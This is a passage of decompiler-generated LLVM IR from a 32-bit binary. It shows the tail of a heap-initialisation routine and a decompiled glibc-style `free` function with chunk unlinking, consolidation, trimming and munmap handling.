  %v3_805354c = add i32 %v2_805354c, %v1_8053544
  %v4_805354c = inttoptr i32 %v3_805354c to i32*
  %v5_805354c = load i32, i32* %v4_805354c, align 4
  store i32 %v5_805354c, i32* %eax.global-to-local, align 4
  %v3_8053550 = inttoptr i32 %v2_805354c to i32*
  store i32 %v1_8053544, i32* %v3_8053550, align 4
  %v0_8053553 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053553 = urem i32 %v0_8053553, 2
  %v2_8053553 = icmp eq i32 %v1_8053553, 0
  store i32 %v1_8053553, i32* %eax.global-to-local, align 4
  %v1_8053558 = icmp eq i1 %v2_8053553, false
  br i1 %v1_8053558, label %dec_label_pc_8053579, label %dec_label_pc_805355a

dec_label_pc_805355a:                             ; preds = %dec_label_pc_805354c
  %v0_805355a = load i32, i32* @ebx, align 4
  %v1_805355a = add i32 %v0_805355a, 8
  %v2_805355a = inttoptr i32 %v1_805355a to i32*
  %v3_805355a = load i32, i32* %v2_805355a, align 4
  store i32 %v3_805355a, i32* @edx, align 4
  %v1_805355d = add i32 %v0_805355a, 12
  %v2_805355d = inttoptr i32 %v1_805355d to i32*
  %v3_805355d = load i32, i32* %v2_805355d, align 4
  store i32 %v3_805355d, i32* %eax.global-to-local, align 4
  %v1_8053560 = add i32 %v3_805355a, 12
  %v2_8053560 = inttoptr i32 %v1_8053560 to i32*
  %v3_8053560 = load i32, i32* %v2_8053560, align 4
  store i32 %v3_8053560, i32* @esi, align 4
  %v12_8053563 = icmp eq i32 %v3_8053560, %v0_805355a
  %v1_8053565 = icmp eq i1 %v12_8053563, false
  br i1 %v1_8053565, label %dec_label_pc_805356c, label %dec_label_pc_8053567

dec_label_pc_8053567:                             ; preds = %dec_label_pc_805355a
  %v1_8053567 = add i32 %v3_805355d, 8
  %v2_8053567 = inttoptr i32 %v1_8053567 to i32*
  %v3_8053567 = load i32, i32* %v2_8053567, align 4
  %v15_8053567 = icmp eq i32 %v3_8053567, %v3_8053560
  br i1 %v15_8053567, label %dec_label_pc_8053571, label %dec_label_pc_805356c

dec_label_pc_805356c:                             ; preds = %dec_label_pc_8053567, %dec_label_pc_805355a, %dec_label_pc_805352f, %dec_label_pc_805351c
  %v0_805356c = call i32 @abort()
  store i32 %v0_805356c, i32* %eax.global-to-local, align 4
  %v1_8053573.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053571

dec_label_pc_8053571:                             ; preds = %dec_label_pc_8053567, %dec_label_pc_805356c
  %v1_8053573 = phi i32 [ %v3_805355a, %dec_label_pc_8053567 ], [ %v1_8053573.pre, %dec_label_pc_805356c ]
  %v0_8053573 = phi i32 [ %v3_805355d, %dec_label_pc_8053567 ], [ %v0_805356c, %dec_label_pc_805356c ]
  %v0_8053571 = load i32, i32* @edi, align 4
  %v1_8053571 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053571 = add i32 %v1_8053571, %v0_8053571
  store i32 %v2_8053571, i32* @edi, align 4
  %v2_8053573 = add i32 %v1_8053573, 12
  %v3_8053573 = inttoptr i32 %v2_8053573 to i32*
  store i32 %v0_8053573, i32* %v3_8053573, align 4
  %v0_8053576 = load i32, i32* @edx, align 4
  %v1_8053576 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053576 = add i32 %v1_8053576, 8
  %v3_8053576 = inttoptr i32 %v2_8053576 to i32*
  store i32 %v0_8053576, i32* %v3_8053576, align 4
  br label %dec_label_pc_8053579

dec_label_pc_8053579:                             ; preds = %dec_label_pc_805354c, %dec_label_pc_8053571
  store i32 %v1_80534c4, i32* %eax.global-to-local, align 4
  %v3_805357d = load i32, i32* %v2_805357d, align 4
  store i32 %v3_805357d, i32* @edx, align 4
  %v0_8053580 = load i32, i32* @ecx, align 4
  store i32 %v0_8053580, i32* %v2_805357d, align 4
  %v0_8053583 = load i32, i32* @edi, align 4
  %v1_8053585 = or i32 %v0_8053583, 1
  store i32 %v1_8053585, i32* %eax.global-to-local, align 4
  %v0_8053588 = load i32, i32* @ecx, align 4
  %v1_8053588 = load i32, i32* @edx, align 4
  %v2_8053588 = add i32 %v1_8053588, 12
  %v3_8053588 = inttoptr i32 %v2_8053588 to i32*
  store i32 %v0_8053588, i32* %v3_8053588, align 4
  %v0_805358b = load i32, i32* %eax.global-to-local, align 4
  %v1_805358b = load i32, i32* @ecx, align 4
  %v2_805358b = add i32 %v1_805358b, 4
  %v3_805358b = inttoptr i32 %v2_805358b to i32*
  store i32 %v0_805358b, i32* %v3_805358b, align 4
  store i32 %v1_80534c4, i32* %eax.global-to-local, align 4
  %v0_8053592 = load i32, i32* @edx, align 4
  %v1_8053592 = load i32, i32* @ecx, align 4
  %v2_8053592 = add i32 %v1_8053592, 8
  %v3_8053592 = inttoptr i32 %v2_8053592 to i32*
  store i32 %v0_8053592, i32* %v3_8053592, align 4
  %v0_8053595 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053595 = load i32, i32* @ecx, align 4
  %v2_8053595 = add i32 %v1_8053595, 12
  %v3_8053595 = inttoptr i32 %v2_8053595 to i32*
  store i32 %v0_8053595, i32* %v3_8053595, align 4
  %v0_8053598 = load i32, i32* @edi, align 4
  %v1_8053598 = load i32, i32* @ecx, align 4
  %v3_8053598 = add i32 %v1_8053598, %v0_8053598
  %v4_8053598 = inttoptr i32 %v3_8053598 to i32*
  store i32 %v0_8053598, i32* %v4_8053598, align 4
  br label %dec_label_pc_80535ad

dec_label_pc_805359d:                             ; preds = %dec_label_pc_805353c
  %v0_805359d = load i32, i32* @edi, align 4
  %v2_805359d = add i32 %v0_805359d, %v1_8053544
  %v1_80535a0 = or i32 %v2_805359d, 1
  store i32 %v1_80535a0, i32* %eax.global-to-local, align 4
  %v1_80535a3 = load i32, i32* @ecx, align 4
  %v2_80535a3 = add i32 %v1_80535a3, 4
  %v3_80535a3 = inttoptr i32 %v2_80535a3 to i32*
  store i32 %v1_80535a0, i32* %v3_80535a3, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_80535aa = load i32, i32* @ecx, align 4
  store i32 %v0_80535aa, i32* %v3_80535aa, align 4
  br label %dec_label_pc_80535ad

dec_label_pc_80535ad:                             ; preds = %dec_label_pc_8053579, %dec_label_pc_805359d
  store i32 %v3_80534ff, i32* @ecx, align 4
  %v1_80535b1 = icmp eq i32 %v3_80534ff, 0
  %v1_80535b3 = icmp eq i1 %v1_80535b1, false
  br i1 %v1_80535b3, label %dec_label_pc_80534ff, label %dec_label_pc_80535b9

dec_label_pc_80535b9:                             ; preds = %dec_label_pc_80535ad, %dec_label_pc_80534eb
  store i32 %v4_80534e3, i32* @ecx, align 4
  %v15_80535bd = icmp eq i32 %v0_80534f9, %v4_80534e3
  br i1 %v15_80535bd, label %dec_label_pc_8053641, label %dec_label_pc_80535c3

dec_label_pc_80535c3:                             ; preds = %dec_label_pc_80535b9
  %v4_80535c3 = add i32 %v0_80534f9, 4
  br label %dec_label_pc_80534eb

dec_label_pc_80535cd:                             ; preds = %dec_label_pc_80535dc.preheader, %dec_label_pc_80535cd
  %v1_80535d120 = phi i32 [ 1, %dec_label_pc_80535dc.preheader ], [ %v0_80535dc.pre, %dec_label_pc_80535cd ]
  %v2_80535d1 = mul i32 %v1_80535d120, 8
  %v4_80535d1 = add i32 %v3_80535d1, %v2_80535d1
  store i32 %v4_80535d1, i32* %eax.global-to-local, align 4
  %v1_80535d5 = add i32 %v1_80535d120, 1
  store i32 %v1_80535d5, i32* %edx.global-to-local, align 4
  %v2_80535d6 = add i32 %v4_80535d1, 12
  %v3_80535d6 = inttoptr i32 %v2_80535d6 to i32*
  store i32 %v4_80535d1, i32* %v3_80535d6, align 4
  %v0_80535d9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80535d9 = add i32 %v0_80535d9, 8
  %v3_80535d9 = inttoptr i32 %v2_80535d9 to i32*
  store i32 %v0_80535d9, i32* %v3_80535d9, align 4
  %v0_80535dc.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_80535df = icmp sgt i32 %v0_80535dc.pre, 95
  br i1 %v7_80535df, label %dec_label_pc_80535e1, label %dec_label_pc_80535cd

dec_label_pc_80535e1:                             ; preds = %dec_label_pc_80535cd
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80535e5 = add i32 %tmp11, 864
  %v2_80535e5 = inttoptr i32 %v1_80535e5 to i32*
  %v3_80535e5 = load i32, i32* %v2_80535e5, align 4
  %v4_80535e5 = or i32 %v3_80535e5, 1
  store i32 %v4_80535e5, i32* %v2_80535e5, align 4
  %v0_80535ec = load i32, i32* %eax.global-to-local, align 4
  %v1_80535ec = add i32 %v0_80535ec, 840
  %v2_80535ec = inttoptr i32 %v1_80535ec to i32*
  store i32 0, i32* %v2_80535ec, align 4
  %v0_80535f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80535f6 = add i32 %v0_80535f6, 852
  %v2_80535f6 = inttoptr i32 %v1_80535f6 to i32*
  store i32 65536, i32* %v2_80535f6, align 4
  %v0_8053600 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053600 = add i32 %v0_8053600, 844
  %v2_8053600 = inttoptr i32 %v1_8053600 to i32*
  store i32 262144, i32* %v2_8053600, align 4
  %v0_805360a = load i32, i32* %eax.global-to-local, align 4
  %v1_805360a = add i32 %v0_805360a, 836
  %v2_805360a = inttoptr i32 %v1_805360a to i32*
  store i32 262144, i32* %v2_805360a, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_805361b = load i32, i32* %arg1, align 4
  %v1_805361d = urem i32 %v2_805361b, 4
  %v1_8053620 = or i32 %v1_805361d, 72
  store i32 %v1_8053620, i32* %arg1, align 4
  %v0_8053625 = load i32, i32* @edx, align 4
  %v1_8053627 = add i32 %v0_8053625, 52
  store i32 %v1_8053627, i32* %eax.global-to-local, align 4
  %v2_805362a = add i32 %v0_8053625, 44
  %v3_805362a = inttoptr i32 %v2_805362a to i32*
  store i32 %v1_8053627, i32* %v3_805362a, align 4
  %v1_805362f = call i32 @sysconf(i32 30)
  store i32 %v1_805362f, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_805363b = add i32 %tmp11, 860
  %v3_805363b = inttoptr i32 %v2_805363b to i32*
  store i32 %v1_805362f, i32* %v3_805363b, align 4
  br label %dec_label_pc_8053641

dec_label_pc_8053641:                             ; preds = %dec_label_pc_80535b9, %dec_label_pc_80535e1
  store i32 %v0_80534a4, i32* @ebx, align 4
  store i32 %v0_80534a3, i32* @esi, align 4
  store i32 %v0_80534a2, i32* @edi, align 4
  %v0_8053648 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053648

; uselistorder directives
  uselistorder i32 %v0_80535d9, { 1, 0 }
  uselistorder i32 %v0_8053598, { 1, 0 }
  uselistorder i32 %v1_8053553, { 1, 0 }
  uselistorder i32 %v2_805354c, { 1, 0 }
  uselistorder i32 %v1_8053544, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053550, { 1, 0 }
  uselistorder i32 %v3_80534ff, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805351c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80534f9, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80535aa, { 1, 0 }
  uselistorder i32 %v1_80534c4, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8053641, { 1, 0 }
  uselistorder label %dec_label_pc_80535cd, { 1, 0 }
  uselistorder label %dec_label_pc_80535ad, { 1, 0 }
  uselistorder label %dec_label_pc_8053579, { 1, 0 }
  uselistorder label %dec_label_pc_8053571, { 1, 0 }
  uselistorder label %dec_label_pc_805353c, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053649 = load i32, i32* @ebp, align 4
  %v0_805364a = load i32, i32* @edi, align 4
  %v0_805364b = load i32, i32* @esi, align 4
  %v0_805364c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053654 = icmp eq i32 %arg1, 0
  br i1 %v1_8053654, label %dec_label_pc_80537dd, label %dec_label_pc_805365c

dec_label_pc_805365c:                             ; preds = %entry
  %v2_8053667 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053667, i32* @eax, align 4
  %v2_805366c = call i32 @__pthread_return_void(i32 %v2_8053667, i32 134562611)
  store i32 %v2_805366c, i32* %eax.global-to-local, align 4
  %v1_8053678 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3f0.493 to i32))
  %v1_805367d = add i32 %arg1, -8
  store i32 %v1_805367d, i32* @ecx, align 4
  %v0_8053680 = load i8, i8* @global_var_8061860.494, align 1
  %v1_8053680 = sext i8 %v0_8053680 to i32
  store i32 %v1_8053680, i32* %eax.global-to-local, align 4
  %v1_8053688 = add i32 %arg1, -4
  %v2_8053688 = inttoptr i32 %v1_8053688 to i32*
  %v3_8053688 = load i32, i32* %v2_8053688, align 4
  %v1_805368d = and i32 %v3_8053688, -4
  %v4_805368d = trunc i32 %v1_805368d to i8
  store i32 %v1_805368d, i32* @ebx, align 4
  %v8_8053692 = icmp ugt i8 %v4_805368d, %v0_8053680
  br i1 %v8_8053692, label %dec_label_pc_80536b4, label %dec_label_pc_8053694

dec_label_pc_8053694:                             ; preds = %dec_label_pc_805365c
  %v2_8053694 = udiv i32 %v3_8053688, 8
  %v1_8053697 = or i32 %v1_8053680, 3
  %v3_8053697 = trunc i32 %v1_8053697 to i8
  store i32 %v1_8053697, i32* %eax.global-to-local, align 4
  store i8 %v3_8053697, i8* @global_var_8061860.494, align 32
  %v1_805369f = mul nuw i32 %v2_8053694, 4
  %v2_805369f = add i32 %v1_805369f, ptrtoint (i8* @global_var_8061860.494 to i32)
  store i32 %v2_805369f, i32* @edx, align 4
  %v1_80536a6 = add i32 %v1_805369f, add (i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32 -4)
  %v2_80536a6 = inttoptr i32 %v1_80536a6 to i32*
  %v3_80536a6 = load i32, i32* %v2_80536a6, align 4
  store i32 %v3_80536a6, i32* %eax.global-to-local, align 4
  %v3_80536a9 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80536a6, i32* %v3_80536a9, align 4
  %v0_80536ac = load i32, i32* @ecx, align 4
  %v1_80536ac = load i32, i32* @edx, align 4
  %v2_80536ac = add i32 %v1_80536ac, -4
  %v3_80536ac = inttoptr i32 %v2_80536ac to i32*
  store i32 %v0_80536ac, i32* %v3_80536ac, align 4
  br label %dec_label_pc_80537cc

dec_label_pc_80536b4:                             ; preds = %dec_label_pc_805365c
  %v1_80536b4 = trunc i32 %v3_8053688 to i8
  %v2_80536b4 = and i8 %v1_80536b4, 2
  %v3_80536b4 = icmp eq i8 %v2_80536b4, 0
  %v5_80536b4 = zext i8 %v2_80536b4 to i32
  %v7_80536b4 = and i32 %v3_8053688, -256
  %v8_80536b4 = or i32 %v5_80536b4, %v7_80536b4
  store i32 %v8_80536b4, i32* @edx, align 4
  %v1_80536b7 = icmp eq i1 %v3_80536b4, false
  br i1 %v1_80536b7, label %dec_label_pc_80537ac, label %dec_label_pc_80536bd

dec_label_pc_80536bd:                             ; preds = %dec_label_pc_80536b4
  %v1_80536bd = or i32 %v1_8053680, 1
  %v3_80536bd = trunc i32 %v1_80536bd to i8
  store i32 %v1_80536bd, i32* %eax.global-to-local, align 4
  %v2_80536c0 = add i32 %v1_805368d, %v1_805367d
  store i32 %v2_80536c0, i32* @esi, align 4
  store i8 %v3_80536bd, i8* @global_var_8061860.494, align 32
  %v1_80536c8 = add i32 %v2_80536c0, 4
  %v2_80536c8 = inttoptr i32 %v1_80536c8 to i32*
  %v3_80536c8 = load i32, i32* %v2_80536c8, align 4
  store i32 %v3_80536c8, i32* %eax.global-to-local, align 4
  %v2_80536cf = inttoptr i32 %v1_8053688 to i8*
  %v3_80536cf = load i8, i8* %v2_80536cf, align 1
  %v4_80536cf = urem i8 %v3_80536cf, 2
  %v5_80536cf = icmp eq i8 %v4_80536cf, 0
  %v1_80536d3 = icmp eq i1 %v5_80536cf, false
  br i1 %v1_80536d3, label %dec_label_pc_80536f6, label %dec_label_pc_80536d5

dec_label_pc_80536d5:                             ; preds = %dec_label_pc_80536bd
  %v2_80536d5 = inttoptr i32 %v1_805367d to i32*
  %v3_80536d5 = load i32, i32* %v2_80536d5, align 4
  store i32 %v3_80536d5, i32* @ebp, align 4
  %v2_80536da = sub i32 %v1_805367d, %v3_80536d5
  store i32 %v2_80536da, i32* %eax.global-to-local, align 4
  %v1_80536dc = add i32 %v2_80536da, 8
  %v2_80536dc = inttoptr i32 %v1_80536dc to i32*
  %v3_80536dc = load i32, i32* %v2_80536dc, align 4
  store i32 %v3_80536dc, i32* @edi, align 4
  %v1_80536df = add i32 %v2_80536da, 12
  %v2_80536df = inttoptr i32 %v1_80536df to i32*
  %v3_80536df = load i32, i32* %v2_80536df, align 4
  store i32 %v3_80536df, i32* @edx, align 4
  %v1_80536e2 = add i32 %v3_80536dc, 12
  %v2_80536e2 = inttoptr i32 %v1_80536e2 to i32*
  %v3_80536e2 = load i32, i32* %v2_80536e2, align 4
  store i32 %v3_80536e2, i32* @ecx, align 4
  %v12_80536e5 = icmp eq i32 %v3_80536e2, %v2_80536da
  %v1_80536e7 = icmp eq i1 %v12_80536e5, false
  br i1 %v1_80536e7, label %dec_label_pc_8053725, label %dec_label_pc_80536e9

dec_label_pc_80536e9:                             ; preds = %dec_label_pc_80536d5
  %v1_80536e9 = add i32 %v3_80536df, 8
  %v2_80536e9 = inttoptr i32 %v1_80536e9 to i32*
  %v3_80536e9 = load i32, i32* %v2_80536e9, align 4
  %v15_80536e9 = icmp eq i32 %v3_80536e9, %v3_80536e2
  %v1_80536ec = icmp eq i1 %v15_80536e9, false
  br i1 %v1_80536ec, label %dec_label_pc_8053725, label %dec_label_pc_80536ee

dec_label_pc_80536ee:                             ; preds = %dec_label_pc_80536e9
  %v2_80536ee = add i32 %v3_80536d5, %v1_805368d
  store i32 %v2_80536ee, i32* @ebx, align 4
  store i32 %v3_80536df, i32* %v2_80536e2, align 4
  %v0_80536f3 = load i32, i32* @edi, align 4
  %v1_80536f3 = load i32, i32* @edx, align 4
  %v2_80536f3 = add i32 %v1_80536f3, 8
  %v3_80536f3 = inttoptr i32 %v2_80536f3 to i32*
  store i32 %v0_80536f3, i32* %v3_80536f3, align 4
  %v0_80536fd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80536f6

dec_label_pc_80536f6:                             ; preds = %dec_label_pc_80536bd, %dec_label_pc_80536ee
  %v1_8053709 = phi i32 [ %v2_80536c0, %dec_label_pc_80536bd ], [ %v0_80536fd.pre, %dec_label_pc_80536ee ]
  %v1_80536fa = and i32 %v3_80536c8, -4
  store i32 %v1_80536fa, i32* @ebp, align 4
  %v1_80536fd = load i32, i32* @global_var_806188c.495, align 4
  %v12_80536fd = icmp eq i32 %v1_8053709, %v1_80536fd
  br i1 %v12_80536fd, label %dec_label_pc_8053757, label %dec_label_pc_8053705

dec_label_pc_8053705:                             ; preds = %dec_label_pc_80536f6
  %v2_8053705 = add i32 %v1_8053709, 4
  %v3_8053705 = add i32 %v2_8053705, %v1_80536fa
  %v4_8053705 = inttoptr i32 %v3_8053705 to i32*
  %v5_8053705 = load i32, i32* %v4_8053705, align 4
  store i32 %v5_8053705, i32* %eax.global-to-local, align 4
  %v3_8053709 = inttoptr i32 %v2_8053705 to i32*
  store i32 %v1_80536fa, i32* %v3_8053709, align 4
  %v0_805370c = load i32, i32* %eax.global-to-local, align 4
  %v1_805370c = urem i32 %v0_805370c, 2
  %v2_805370c = icmp eq i32 %v1_805370c, 0
  store i32 %v1_805370c, i32* %eax.global-to-local, align 4
  %v1_8053711 = icmp eq i1 %v2_805370c, false
  br i1 %v1_8053711, label %dec_label_pc_8053732, label %dec_label_pc_8053713

dec_label_pc_8053713:                             ; preds = %dec_label_pc_8053705
  %v0_8053713 = load i32, i32* @esi, align 4
  %v1_8053713 = add i32 %v0_8053713, 8
  %v2_8053713 = inttoptr i32 %v1_8053713 to i32*
  %v3_8053713 = load i32, i32* %v2_8053713, align 4
  store i32 %v3_8053713, i32* @edx, align 4
  %v1_8053716 = add i32 %v0_8053713, 12
  %v2_8053716 = inttoptr i32 %v1_8053716 to i32*
  %v3_8053716 = load i32, i32* %v2_8053716, align 4
  store i32 %v3_8053716, i32* %eax.global-to-local, align 4
  %v1_8053719 = add i32 %v3_8053713, 12
  %v2_8053719 = inttoptr i32 %v1_8053719 to i32*
  %v3_8053719 = load i32, i32* %v2_8053719, align 4
  store i32 %v3_8053719, i32* @edi, align 4
  %v12_805371c = icmp eq i32 %v3_8053719, %v0_8053713
  %v1_805371e = icmp eq i1 %v12_805371c, false
  br i1 %v1_805371e, label %dec_label_pc_8053725, label %dec_label_pc_8053720

dec_label_pc_8053720:                             ; preds = %dec_label_pc_8053713
  %v1_8053720 = add i32 %v3_8053716, 8
  %v2_8053720 = inttoptr i32 %v1_8053720 to i32*
  %v3_8053720 = load i32, i32* %v2_8053720, align 4
  %v15_8053720 = icmp eq i32 %v3_8053720, %v3_8053719
  br i1 %v15_8053720, label %dec_label_pc_805372a, label %dec_label_pc_8053725

dec_label_pc_8053725:                             ; preds = %dec_label_pc_8053720, %dec_label_pc_8053713, %dec_label_pc_80536e9, %dec_label_pc_80536d5
  %v0_8053725 = call i32 @abort()
  store i32 %v0_8053725, i32* %eax.global-to-local, align 4
  %v1_805372a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805372a

dec_label_pc_805372a:                             ; preds = %dec_label_pc_8053720, %dec_label_pc_8053725
  %v1_805372a = phi i32 [ %v3_8053713, %dec_label_pc_8053720 ], [ %v1_805372a.pre, %dec_label_pc_8053725 ]
  %v0_805372a = phi i32 [ %v3_8053716, %dec_label_pc_8053720 ], [ %v0_8053725, %dec_label_pc_8053725 ]
  %v2_805372a = add i32 %v1_805372a, 12
  %v3_805372a = inttoptr i32 %v2_805372a to i32*
  store i32 %v0_805372a, i32* %v3_805372a, align 4
  %v0_805372d = load i32, i32* @edx, align 4
  %v1_805372d = load i32, i32* %eax.global-to-local, align 4
  %v2_805372d = add i32 %v1_805372d, 8
  %v3_805372d = inttoptr i32 %v2_805372d to i32*
  store i32 %v0_805372d, i32* %v3_805372d, align 4
  %v0_8053730 = load i32, i32* @ebx, align 4
  %v1_8053730 = load i32, i32* @ebp, align 4
  %v2_8053730 = add i32 %v1_8053730, %v0_8053730
  store i32 %v2_8053730, i32* @ebx, align 4
  br label %dec_label_pc_8053732

dec_label_pc_8053732:                             ; preds = %dec_label_pc_8053705, %dec_label_pc_805372a
  %v0_8053732 = load i32, i32* @global_var_806189c.513, align 4
  store i32 %v0_8053732, i32* %eax.global-to-local, align 4
  %v0_8053737 = load i32, i32* @ecx, align 4
  %v1_8053737 = add i32 %v0_8053737, 12
  %v2_8053737 = inttoptr i32 %v1_8053737 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8053737, align 4
  %v0_805373e = load i32, i32* %eax.global-to-local, align 4
  %v1_805373e = load i32, i32* @ecx, align 4
  %v2_805373e = add i32 %v1_805373e, 8
  %v3_805373e = inttoptr i32 %v2_805373e to i32*
  store i32 %v0_805373e, i32* %v3_805373e, align 4
  %v0_8053741 = load i32, i32* @ebx, align 4
  %v1_8053741 = load i32, i32* @ecx, align 4
  %v3_8053741 = add i32 %v1_8053741, %v0_8053741
  %v4_8053741 = inttoptr i32 %v3_8053741 to i32*
  store i32 %v0_8053741, i32* %v4_8053741, align 4
  %v0_8053744 = load i32, i32* @ecx, align 4
  %v1_8053744 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053744 = add i32 %v1_8053744, 12
  %v3_8053744 = inttoptr i32 %v2_8053744 to i32*
  store i32 %v0_8053744, i32* %v3_8053744, align 4
  %v0_8053747 = load i32, i32* @ebx, align 4
  %v1_8053749 = or i32 %v0_8053747, 1
  store i32 %v1_8053749, i32* %eax.global-to-local, align 4
  %v0_805374c = load i32, i32* @ecx, align 4
  store i32 %v0_805374c, i32* @global_var_806189c.513, align 4
  %v2_8053752 = add i32 %v0_805374c, 4
  %v3_8053752 = inttoptr i32 %v2_8053752 to i32*
  store i32 %v1_8053749, i32* %v3_8053752, align 4
  br label %dec_label_pc_8053767

dec_label_pc_8053757:                             ; preds = %dec_label_pc_80536f6
  %v0_8053757 = load i32, i32* @ebx, align 4
  %v2_8053757 = add i32 %v0_8053757, %v1_80536fa
  store i32 %v2_8053757, i32* @ebx, align 4
  %v1_805375b = or i32 %v2_8053757, 1
  store i32 %v1_805375b, i32* %eax.global-to-local, align 4
  %v1_805375e = load i32, i32* @ecx, align 4
  %v2_805375e = add i32 %v1_805375e, 4
  %v3_805375e = inttoptr i32 %v2_805375e to i32*
  store i32 %v1_805375b, i32* %v3_805375e, align 4
  %v0_8053761 = load i32, i32* @ecx, align 4
  store i32 %v0_8053761, i32* @global_var_806188c.495, align 4
  br label %dec_label_pc_8053767

dec_label_pc_8053767:                             ; preds = %dec_label_pc_8053732, %dec_label_pc_8053757
  %v0_8053767 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053767, 131072
  br i1 %tmp21, label %dec_label_pc_80537cc, label %dec_label_pc_805376f

dec_label_pc_805376f:                             ; preds = %dec_label_pc_8053767
  %v0_805376f = load i8, i8* @global_var_8061860.494, align 32
  %v1_805376f = and i8 %v0_805376f, 2
  %v2_805376f = icmp eq i8 %v1_805376f, 0
  br i1 %v2_805376f, label %dec_label_pc_8053788, label %dec_label_pc_8053778

dec_label_pc_8053778:                             ; preds = %dec_label_pc_805376f
  %v2_8053780 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 %v2_8053780, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053788

dec_label_pc_8053788:                             ; preds = %dec_label_pc_805376f, %dec_label_pc_8053778
  %v0_8053788 = load i32, i32* @global_var_806188c.495, align 4
  store i32 %v0_8053788, i32* %eax.global-to-local, align 4
  %v1_805378d = add i32 %v0_8053788, 4
  %v2_805378d = inttoptr i32 %v1_805378d to i32*
  %v3_805378d = load i32, i32* %v2_805378d, align 4
  %v1_8053790 = and i32 %v3_805378d, -4
  store i32 %v1_8053790, i32* %eax.global-to-local, align 4
  %v1_8053793 = load i32, i32* @global_var_8061ba4.511, align 4
  %v7_8053793 = icmp ult i32 %v1_8053790, %v1_8053793
  br i1 %v7_8053793, label %dec_label_pc_80537cc, label %dec_label_pc_805379b

dec_label_pc_805379b:                             ; preds = %dec_label_pc_8053788
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* @edx, align 4
  %v0_80537a0 = load i32, i32* @global_var_8061ba8.509, align 8
  store i32 %v0_80537a0, i32* @eax, align 4
  %v0_80537a5 = call i32 @__malloc_trim()
  store i32 %v0_80537a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537cc

dec_label_pc_80537ac:                             ; preds = %dec_label_pc_80536b4
  %v2_80537ac = inttoptr i32 %v1_805367d to i32*
  %v3_80537ac = load i32, i32* %v2_80537ac, align 4
  %v0_80537af = load i32, i32* @global_var_8061bb0.502, align 16
  %v1_80537af = add i32 %v0_80537af, -1
  store i32 %v1_80537af, i32* @global_var_8061bb0.502, align 16
  %v2_80537b5 = add i32 %v3_80537ac, %v1_805368d
  store i32 %v2_80537b5, i32* %eax.global-to-local, align 4
  %v2_80537b8 = sub i32 %v1_805367d, %v3_80537ac
  %v0_80537be = load i32, i32* @global_var_8061bc4.505, align 4
  %v2_80537be = sub i32 %v0_80537be, %v2_80537b5
  store i32 %v2_80537be, i32* @global_var_8061bc4.505, align 4
  %v4_80537c4 = call i32 @munmap(i32 %v2_80537b8, i32 %v2_80537b5, i32 %v1_805368d, i32 %v1_805368d)
  store i32 %v4_80537c4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537cc

dec_label_pc_80537cc:                             ; preds = %dec_label_pc_8053788, %dec_label_pc_8053767, %dec_label_pc_805379b, %dec_label_pc_8053694, %dec_label_pc_80537ac
  store i32 %v2_8053667, i32* @eax, align 4
  %v2_80537d5 = call i32 @__pthread_return_void(i32 %v2_8053667, i32 1)
  store i32 %v2_80537d5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537dd

dec_label_pc_80537dd:                             ; preds = %entry, %dec_label_pc_80537cc
  %.0 = phi i32 [ undef, %entry ], [ %v2_80537d5, %dec_label_pc_80537cc ]
  store i32 %v0_805364c, i32* @ebx, align 4
  store i32 %v0_805364b, i32* @esi, align 4
  store i32 %v0_805364a, i32* @edi, align 4
  store i32 %v0_8053649, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80537ac, { 1, 0 }
  uselistorder i32 %v0_8053741, { 1, 0 }
  uselistorder i32 %v1_805370c, { 1, 0 }
  uselistorder i32 %v2_8053705, { 1, 0 }
  uselistorder i32 %v1_80536fa, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053709, { 1, 0 }
  uselistorder i32 %v1_805368d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053688, { 1, 2, 0, 3 }
